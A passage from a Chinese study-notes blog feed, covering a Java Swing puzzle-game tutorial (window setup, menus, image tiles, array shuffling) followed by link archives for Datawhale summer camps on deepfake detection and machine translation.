<li>再把菜单添加到窗体当中。</li>
<li>把小图片添加到窗体当中。</li>
<li>打乱数字图片的顺序。</li>
<li>让数字图片可以移动起来。</li>
<li>通关之后的胜利判断。</li>
<li>添加其他额外的功能。</li>
</ol>
<h3 id="主界面搭建"><a class="header-anchor" href="#主界面搭建">¶</a>主界面搭建</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建App类，编写main方法，作用: 程序的主入口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 召唤主界面</span></span><br><span class="line"><span class="type">JFrame</span> <span class="variable">jFrame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置主界面的大小</span></span><br><span class="line">jFrame.setSize(<span class="number">514</span>,<span class="number">595</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将主界面设置到屏幕的正中央</span></span><br><span class="line">jFrame.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将主界面置顶</span></span><br><span class="line">jFrame.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭主界面的时候让代码一起停止</span></span><br><span class="line">jFrame.setDefaultCloseOperation(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//给主界面设置一个标题</span></span><br><span class="line">jFrame.setTitle(<span class="string">&quot;拼图游戏单机版 v1.0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.让主界面显示出来</span></span><br><span class="line">jFrame.setVisible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>注意事项</strong>：jFrame.setVisible(true);必须要写在最后一行</li>
</ul>
<h3 id="利用继承改进代码"><a class="header-anchor" href="#利用继承改进代码">¶</a>利用继承改进代码</h3>
<ul>
<li>**需求：**如果把所有的代码都写在main方法中，那么main方法里面的代码，就包含游戏主界面的代码，登录界面的代码，注册界面的代码，会变得非常臃肿后期维护也是一件非常难的事情，所以我们需要用继承改进，改进之后，代码就可以分类了</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//登录界面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">//LoginJFrame 表示登录界面</span></span><br><span class="line">    <span class="comment">//以后所有跟登录相关的代码，都写在这里</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginJFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//在创建登录界面的时候，同时给这个界面去设置一些信息</span></span><br><span class="line">        <span class="comment">//比如，宽高，直接展示出来</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">488</span>,<span class="number">430</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图 登录&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line"> <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//让显示显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//注册界面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegisterJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">//跟注册相关的代码，都写在这个界面中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RegisterJFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">488</span>,<span class="number">500</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图 注册&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//让显示显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        getContentPane();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏主界面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GameJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图单机版 v1.0&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">    <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//让界面显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：this表示当前窗体</li>
</ul>
<h3 id="菜单制作"><a class="header-anchor" href="#菜单制作">¶</a>菜单制作</h3>
<ul>
<li>
<p>在菜单中有：JMenuBar、JMenu、JMenuItem</p>
</li>
<li>
<p>其中JMenuBar是整体，一个界面中一般只有一个JMenuBar（顶栏操作栏）。而JMenu是菜单中的选项，可以有多个。JMenuItem是选项下面的条目，也可以有多个</p>
</li>
<li>
<p>代码步骤</p>
<ul>
<li>创建JMenuBar对象</li>
<li>创建JMenu对象</li>
<li>创建JMenuItem对象</li>
<li>把JMenuItem添加到JMenu中</li>
<li>把JMenu添加到JMenuBar中</li>
<li>把整个JMenuBar设置到整个界面中</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个菜单对象</span></span><br><span class="line"><span class="type">JMenuBar</span> <span class="variable">jMenuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"><span class="comment">//设置菜单的宽高</span></span><br><span class="line">jMenuBar.setSize(<span class="number">514</span>, <span class="number">20</span>);</span><br><span class="line"><span class="comment">//创建一个选项</span></span><br><span class="line"><span class="type">JMenu</span> <span class="variable">jMenu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;功能&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个条目</span></span><br><span class="line">jMenuItem1 = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把条目添加到选项当中</span></span><br><span class="line">jMenu1.add(jMenuItem1);</span><br><span class="line"><span class="comment">//把选项添加到菜单当中</span></span><br><span class="line">jMenuBar.add(jMenu1);</span><br><span class="line"><span class="comment">//把菜单添加到最外层的窗体当中</span></span><br><span class="line"><span class="built_in">this</span>.setJMenuBar(jMenuBar);</span><br></pre></td></tr></table></figure>
<h3 id="添加图片"><a class="header-anchor" href="#添加图片">¶</a>添加图片</h3>
<ul>
<li>
<p>使用到的Java类</p>
<ul>
<li>ImageIcon：描述图片的类，可以关联计算中任意位置的图片。但一般会把图片拷贝到当前项目中。</li>
<li>JLabel：用来管理图片，文字的类。可以用来设置位置，宽高。</li>
</ul>
</li>
<li>
<p>坐标</p>
<ul>
<li>界面左上角的点可以看做是坐标的原点，横向的是X轴，纵向的是Y轴。</li>
<li>图片的位置其实取决于图片左上角的点，在坐标中的位置。</li>
<li>如果是（0,0）那么该图片会显示在屏幕的左上角</li>
</ul>
</li>
<li>
<p>步骤</p>
</li>
</ul>
<ol>
<li>取消整个界面的默认居中布局</li>
<li>创建ImageIcon对象，并制定图片位置。</li>
<li>创建JLabel对象，并把ImageIcon对象放到小括号中。</li>
<li>利用JLabel对象设置大小，宽高。</li>
<li>将JLabel对象添加到整个界面当中。</li>
</ol>
<h3 id="打乱图片的位置"><a class="header-anchor" href="#打乱图片的位置">¶</a>打乱图片的位置</h3>
<ul>
<li>每一张图片都对应1~15之间的数字，空白处为0，打乱图片实际上就是把数字打乱，添加图片的时候按照打乱的图片添加即可</li>
</ul>
<h4 id="打乱数组中的数组"><a class="header-anchor" href="#打乱数组中的数组">¶</a>打乱数组中的数组</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求：</span></span><br><span class="line">        <span class="comment">//把一个一维数组中的数据：0~15 打乱顺序</span></span><br><span class="line">        <span class="comment">//然后再按照4个一组的方式添加到二维数组当中</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.定义一个一维数组</span></span><br><span class="line">        <span class="type">int</span>[] tempArr = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line">        <span class="comment">//2.打乱数组中的数据的顺序</span></span><br><span class="line">        <span class="comment">//遍历数组，得到每一个元素，拿着每一个元素跟随机索引上的数据进行交换</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//获取到随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(tempArr.length);</span><br><span class="line">            <span class="comment">//拿着遍历到的每一个数据，跟随机索引上的数据进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> tempArr[i];</span><br><span class="line">            tempArr[i] = tempArr[index];</span><br><span class="line">            tempArr[index] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            System.out.print(tempArr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.创建一个二维数组</span></span><br><span class="line">        <span class="type">int</span>[][] data = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.给二维数组添加数据</span></span><br><span class="line">        <span class="comment">//解法一：</span></span><br><span class="line">        <span class="comment">//遍历一维数组tempArr得到每一个元素，把每一个元素依次添加到二维数组当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            data[i / <span class="number">4</span>][i % <span class="number">4</span>] = tempArr[i];  <span class="comment">// 这行妙啊</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历二维数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; data[i].length; j++) &#123;</span><br><span class="line">                System.out.print(data[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打乱图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">//JFrame 界面，窗体</span></span><br><span class="line">    <span class="comment">//子类呢？也表示界面，窗体</span></span><br><span class="line">    <span class="comment">//规定：GameJFrame这个界面表示的就是游戏的主界面</span></span><br><span class="line">    <span class="comment">//以后跟游戏相关的所有逻辑都写在这个类中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个二维数组</span></span><br><span class="line">    <span class="comment">//目的：用来管理数据</span></span><br><span class="line">    <span class="comment">//加载图片的时候，会根据二维数组中的数据进行加载</span></span><br><span class="line">    <span class="type">int</span>[][] data = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GameJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//初始化界面</span></span><br><span class="line">        initJFrame();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化菜单</span></span><br><span class="line">        initJMenuBar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化数据（打乱）</span></span><br><span class="line">        initData();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化图片（根据打乱之后的结果去加载图片）</span></span><br><span class="line">        initImage();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//让界面显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化数据（打乱）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个一维数组</span></span><br><span class="line">        <span class="type">int</span>[] tempArr = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2.打乱数组中的数据的顺序</span></span><br><span class="line">        <span class="comment">//遍历数组，得到每一个元素，拿着每一个元素跟随机索引上的数据进行交换</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//获取到随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(tempArr.length);</span><br><span class="line">            <span class="comment">//拿着遍历到的每一个数据，跟随机索引上的数据进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> tempArr[i];</span><br><span class="line">            tempArr[i] = tempArr[index];</span><br><span class="line">            tempArr[index] = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.给二维数组添加数据</span></span><br><span class="line">        <span class="comment">//遍历一维数组tempArr得到每一个元素，把每一个元素依次添加到二维数组当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            data[i / <span class="number">4</span>][i % <span class="number">4</span>] = tempArr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化图片</span></span><br><span class="line">    <span class="comment">//添加图片的时候，就需要按照二维数组中管理的数据添加图片</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initImage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//外循环 --- 把内循环重复执行了4次。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//内循环 --- 表示在一行添加4张图片</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="comment">//获取当前要加载图片的序号</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> data[i][j];</span><br><span class="line">                <span class="comment">//创建一个JLabel的对象（管理容器）</span></span><br><span class="line">                <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;C:\\Users\\moon\\IdeaProjects\\basic-code\\puzzlegame\\image\\animal\\animal3\\&quot;</span> + num + <span class="string">&quot;.jpg&quot;</span>));</span><br><span class="line">                <span class="comment">//指定图片位置</span></span><br><span class="line">                jLabel.setBounds(<span class="number">105</span> * j, <span class="number">105</span> * i, <span class="number">105</span>, <span class="number">105</span>);</span><br><span class="line">                <span class="comment">//把管理容器添加到界面中</span></span><br><span class="line">                <span class="built_in">this</span>.getContentPane().add(jLabel);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJMenuBar</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//创建整个的菜单对象</span></span><br><span class="line">        <span class="type">JMenuBar</span> <span class="variable">jMenuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建菜单上面的两个选项的对象 （功能  关于我们）</span></span><br><span class="line">        <span class="type">JMenu</span> <span class="variable">functionJMenu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;功能&quot;</span>);</span><br><span class="line">        <span class="type">JMenu</span> <span class="variable">aboutJMenu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;关于我们&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建选项下面的条目对象</span></span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">replayItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">reLoginItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新登录&quot;</span>);</span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">closeItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;关闭游戏&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">accountItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;公众号&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将每一个选项下面的条目天极爱到选项当中</span></span><br><span class="line">        functionJMenu.add(replayItem);</span><br><span class="line">        functionJMenu.add(reLoginItem);</span><br><span class="line">        functionJMenu.add(closeItem);</span><br><span class="line"></span><br><span class="line">        aboutJMenu.add(accountItem);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将菜单里面的两个选项添加到菜单当中</span></span><br><span class="line">        jMenuBar.add(functionJMenu);</span><br><span class="line">        jMenuBar.add(aboutJMenu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给整个界面设置菜单</span></span><br><span class="line">        <span class="built_in">this</span>.setJMenuBar(jMenuBar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图单机版 v1.0&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>【CV夏令营】链接留档</title>
    <url>/project/2024/07/14/CS_Notes/CV/%E3%80%90CV%E5%A4%8F%E4%BB%A4%E8%90%A5%E3%80%91%E9%93%BE%E6%8E%A5%E7%95%99%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.kaggle.com/competitions/multi-ffdi/submissions">Inclusion・The Global Multimedia Deepfake Detection | Kaggle</a>   比赛链接</p>
<ul>
<li>
<p>在本课程中，我们将深入探讨Deepfake技术的原理、应用案例以及检测方法。通过实践项目和案例研究，你们将有机会亲自动手，体验Deepfake技术的制作过程，并学习如何辨别Deepfake内容。</p>
</li>
<li>
<p>接下来我们会基于这个赛题进行更多的知识点学习，会涉及到：</p>
<ul>
<li>深度学习概念</li>
<li>AIGC 和 Deepfake的关系</li>
<li>深度学习模型原理</li>
<li>构建Deepfake攻防模型</li>
<li>数据集处理与增强</li>
</ul>
</li>
</ul>
<h3 id="Task-1：了解Deepfake-baseline提交"><a class="header-anchor" href="#Task-1：了解Deepfake-baseline提交">¶</a>Task 1：了解Deepfake &amp; baseline提交</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/Uou8w9igsibGP7kduiycCgesnOh">‬‌‬‍⁠⁠‍‍‬‍﻿⁠‬⁠⁠‌‌⁠‌‬‌‌‌‌⁠‌‍‌⁠‌‬从零入门CV图像竞赛(Deepfake攻防) - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://datawhaler.feishu.cn/wiki/L4kKwgPqMiGFb4kmCKecKCpxnqd">Task1：了解Deepfake &amp; 初探baseline - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://www.kaggle.com/code/finlay/deepfake-ffdi-baseline/">Deepfake-FFDI-图像赛题 baseline (kaggle.com)</a></p>
<h3 id="Task-2：实现一个基于深度学习的Deepfake检测模型"><a class="header-anchor" href="#Task-2：实现一个基于深度学习的Deepfake检测模型">¶</a>Task 2：实现一个基于深度学习的Deepfake检测模型</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/CsS2weZvgigEKok6IzycdiVunuy">‌﻿﻿﻿‬‌⁠‌‬﻿﻿‌‌‍⁠⁠﻿‌‌‌﻿﻿﻿‌‍⁠Task2：从baseline入门深度学习 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://www.kaggle.com/code/finlay/deepfake-ffdi-ch2/">Deepfake-FFDI-图像赛题 ch2 (kaggle.com)</a>   实操代码地址</p>
<h3 id="Task-3："><a class="header-anchor" href="#Task-3：">¶</a>Task 3：</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/Ad0jwNK8Eis5XwksFZ7cCvb6nHh">‍﻿‌⁠﻿﻿﻿‌‬‌﻿‍‬⁠⁠‌‍﻿‬‍‬‍‍⁠﻿‌‌Task3知识点文档 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://www.kaggle.com/code/finlay/deepfake-ffdi-ch3">Deepfake-FFDI-图像赛题 ch3 (kaggle.com)</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>CV notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>CV</tag>
      </tags>
  </entry>
  <entry>
    <title>【NLP夏令营】链接留档</title>
    <url>/project/2024/07/13/CS_Notes/NLP/%E3%80%90NLP%E5%A4%8F%E4%BB%A4%E8%90%A5%E3%80%91%E9%93%BE%E6%8E%A5%E7%95%99%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/FfZvw4QIzibTkQkM6FMcrqCgnce">‌‍‍‬⁠‌⁠⁠﻿⁠‬﻿⁠‍‍⁠‌‌‍⁠‬‌‌⁠⁠⁠活动 ｜ Datawhale AI 夏令营 - 飞书云文档 (feishu.cn)</a></p>
<ul>
<li>两个推荐资料
<ul>
<li><a href="https://datawhaler.feishu.cn/wiki/JcnEwCYO2i0v3FkBizWcLfWanKb">‌‌‌⁠‬﻿‍‌‌‍‬⁠﻿‬‌‌﻿‍﻿⁠﻿‬‍⁠‬Datawhale人工智能培养方案V2.0 - 飞书云文档 (feishu.cn)</a></li>
<li><a href="https://datawhaler.feishu.cn/file/IXdDbOBgIoZbtvxLukqc2432nQd">⁠‌‍‬﻿‍‬﻿‍﻿﻿‌﻿﻿⁠﻿⁠‍﻿‬‌‬‬‬﻿‍﻿﻿‌《数据竞赛入门讲义》.pdf - 飞书云文档 (feishu.cn)</a></li>
</ul>
</li>
<li>比赛地址
<ul>
<li><a href="https://challenge.xfyun.cn/topic/info?type=machine-translation-2024&amp;option=ssgy&amp;ch=dw24_sHJm0e">2024 iFLYTEK A.I.开发者大赛-讯飞开放平台 (xfyun.cn)</a></li>
</ul>
</li>
</ul>
<h3 id="Task-1：跑通baseline并提交，查看得分"><a class="header-anchor" href="#Task-1：跑通baseline并提交，查看得分">¶</a>Task 1：跑通baseline并提交，查看得分</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/TObSwHZdFi2y0XktauWcolpcnyf">‍‌‬⁠﻿‍﻿﻿﻿⁠‬‌﻿‌‍‬‍‬‌﻿‍‌⁠‬‍⁠‌‬‍⁠从零入门NLP竞赛 - 飞书云文档 (feishu.cn)</a>    Task1 操作指南</p>
<p><a href="https://datawhaler.feishu.cn/wiki/FVs2wAVN5iqHMqk5lW2ckfhAncb">‌‌‍⁠‍‬⁠⁠‌‬⁠‍‍‍⁠⁠‬﻿‌⁠⁠‬‍‌﻿‍‍Task1：了解机器翻译 &amp; 理解赛题 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://blog.csdn.net/qq_60489376/article/details/140395962">Datawhale AI夏令营- 讯飞机器翻译挑战赛baseline解析-CSDN博客</a>  助教写的，比较完整的笔记</p>
<h3 id="Task-2：从baseline代码详解入门深度学习"><a class="header-anchor" href="#Task-2：从baseline代码详解入门深度学习">¶</a>Task 2：从baseline代码详解入门深度学习</h3>
